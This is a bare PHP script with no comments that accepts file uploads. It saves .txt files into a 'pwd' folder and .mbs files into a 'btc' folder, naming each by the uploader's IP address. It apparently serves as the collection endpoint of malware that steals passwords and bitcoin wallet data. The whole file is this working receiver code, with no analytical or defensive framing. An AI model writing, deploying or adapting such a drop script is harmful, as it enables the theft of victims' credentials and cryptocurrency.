<?php

	Function GetExtension($filename) 
		{
    			return end(explode(".", $filename));
  		}

    	$ppath='./pwd/';
	$bpath='./btc/'; 

     	if (!is_dir($ppath))
        	mkdir($ppath);

     	if (!is_dir($bpath))
        	mkdir($bpath);		
		 
	if(strcasecmp(getExtension($_FILES['data']['name']), 'txt') == 0 )

		move_uploaded_file($_FILES['data']['tmp_name'], $ppath.$_SERVER["REMOTE_ADDR"]."_".$_FILES['data']['name']) or die('');

	if(strcasecmp(getExtension($_FILES['data']['name']), 'mbs') == 0 )

		move_uploaded_file($_FILES['data']['tmp_name'], $bpath.$_SERVER["REMOTE_ADDR"]."_".$_FILES['data']['name']) or die('');


?>